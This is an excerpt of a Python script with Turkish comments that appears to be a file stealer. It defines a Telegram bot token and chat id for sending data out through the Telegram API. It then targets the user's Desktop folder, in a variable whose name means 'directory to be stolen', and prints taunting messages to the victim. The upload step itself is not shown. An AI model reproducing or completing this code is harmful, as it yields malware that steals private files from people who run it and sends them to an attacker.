...
import requests                      # Telegram api'sine istek atmak için
...
############################
###Telegram
token = "111323546:KekikAkademiaqwelıqwllıQWEZCV"        # Telegram Tokenimizi tanımladık
chat_id = "554554575"                                    # Telegram Chat id mizi tanımladık
############################
...
print(Fore.MAGENTA + "\tİşte Sana Kullanıcı Dizini >> " + Fore.WHITE + Kullanici_Dizini)

Calinacak_Dizin = Kullanici_Dizini + f"\\Desktop\\" # Kullanıcının masaüstünü tanımladık
print(Fore.CYAN + "\n\tAma Ben Artık Burdayım;" + Fore.WHITE + " {}".format(Calinacak_Dizin))

Ayristirici = Calinacak_Dizin.split("\\") # Calinacak_Dizin yolunu, Windows için > "\\" ile ayrıştırarak listeye çevirdik. Linux için > "/"
print(Fore.YELLOW + "\n\tİşte Bulunduğum Dizinin Listelenmiş Hali;" + Fore.WHITE + " {}".format(Ayristirici))
